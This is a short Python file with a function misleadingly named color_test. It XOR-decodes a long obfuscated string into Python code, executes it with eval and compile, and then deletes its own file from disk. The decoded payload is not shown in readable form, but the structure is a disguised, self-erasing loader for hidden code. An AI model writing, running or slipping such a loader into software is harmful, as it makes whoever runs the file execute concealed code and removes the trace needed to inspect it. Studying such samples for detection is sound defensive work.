import os
def color_test():
    wopvEaTEcopFEavc ="X^IZG@\x15G_RE^ZBY;ZU@]@G\x17@CTDFZU\\K@;]W\x15@UYMQXE^\x17CIBMR]\x19\x1d\x1cJLTCABO^C\\\x1d\x12x^ZAL\x14\x1b\x0e=\x10\x11\x17\x19GPM[\x10^G\\_\x10\x15\x1eC^D\x1e\x18GYC\x1fC@\x12\x19\x14\x12@\x14\x1a\x11YF\x10R\x0b9\x18\x10\x12\x12\x13\x17\x13\x16P\x1aCG_M]\x1b\x13\x16\x13?VKWT\x17XD\x13P]@^KC\x10CQ_VNP;SCWZ\x17GLC\x14^YD[DF\x14VBVA3YTI\\BE\x17JDZBCXPQBE9GFSCKZVQFD\x1dPPTY\x18h\x13D_UF\x12[CGFE\x0e\x1b\x1aRU\x16WC[AW_A\x16ZXZ\x18@\x16_Q\x04\x0cSJ[VH\\LS@Z\x08\x17TVW]U\x1aGM\x14\x19y\x12\x1bC]A\x18ZQZQV\x1eAN\x19\x0f\x17VTA\x1cZDZ_\x14\x01\x0f\x15\x08\x15\x13\x12\x15T[^^\\\x15\x1bL\x11\x1cL]B\x1dPVP^S\x1aDL\x16\x07\x17WTB\x1e[EUT\x19\x05\t\x11\x02\x19\x16\x16\x11INDY[\\\n\x18\x1aEXA\x17TVW]U\x1aGM\x14\n\x19VQA\x1f_BU\\\x19\x0b\r\x16\x00\x17\x1fm\x1a\x1eB_VX]\x0bgFFT\x1a3GPYZAV\x1bPJRFo\x01n\x11:\x12\x12\x13\x17\x13\x16\x16\x14\x16\x17\x14\x102\x13\x11\x14\x11\x15\x10\x19\x18_\x19T[\\JU\x18\x183\x17\x10\x11\x14\x12\x19\x18\x15EGH\x02=\x17\x14\x15\x10\x14\x17\x14\x14\x14\x16\x12\x14DESGK_Z\\@C\x1fTX]T\x1a\x13GJ@YY]\x07\x13\x1eGTE\x1a\x1aAZC\x1dAA\x15\x0e\x1bUVN\x1f\\G_[\x13\x04\x08\x12\x05\x15\x10\x1b\x14\x13B\\TY\\\x04lKBR\x1e9\x19\x10\x10\x11\x19\x17\x10\x11QJZ]EE\x0f;\x18\x17\x17\x14\x15\x10\x14\x17\x14\x14\x14\x16BF^^E\x1f\x10:339" 
    iOpvEoeaaeavocp = "1395545733185041380223736644569831415098977739001970142985151877450474446247017909930179182173416343"
    uocpEAtacovpe = len(wopvEaTEcopFEavc)
    oIoeaTEAcvpae = ""
    for i in range(uocpEAtacovpe):
        nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[i]
        qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[i % len(iOpvEoeaaeavocp)]
        oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))
    eval(compile(oIoeaTEAcvpae, '<string>', 'exec'))
    os.remove(os.path.abspath(__file__))
color_test()

